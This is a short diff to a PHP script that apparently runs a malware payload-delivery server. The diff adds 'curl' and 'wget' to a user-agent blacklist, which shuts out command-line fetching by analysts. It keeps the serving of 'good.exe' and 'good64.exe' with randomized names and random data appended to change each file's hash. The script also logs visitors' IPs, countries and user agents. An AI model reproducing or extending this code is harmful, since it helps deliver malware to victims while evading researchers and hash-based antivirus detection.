@@ -9,6 +9,8 @@ $ua_blacklist = array(
   "iPad",
   "iPod",
   "Android",
+  "curl",
+  "wget",
 );
 
 // IP blacklist, put IPs here that you want blocked
@@ -27,7 +29,7 @@ $svr = '127.0.0.1';
 
 // Name of payload(s). When it is served to the user
 // it will have its named randomized as well as
-// random data appended to modify the hash
+// random data appeneded to modify the hash
 $bit32 = 'good.exe';
 $bit64 = 'good64.exe';
 
@@ -118,6 +120,9 @@ if ($srvWrong == TRUE) {
 
 
 $utils->writeLog($workingDir, $rhost, $geo->countryCode, $uaString, $name, $srvWrong, $isOkay);
-$utils->cleanUp($workingDir, $name);
+
+if (is_null($name) == FALSE) {
+  $utils->cleanUp($workingDir, $name);
+}
 
 ?>
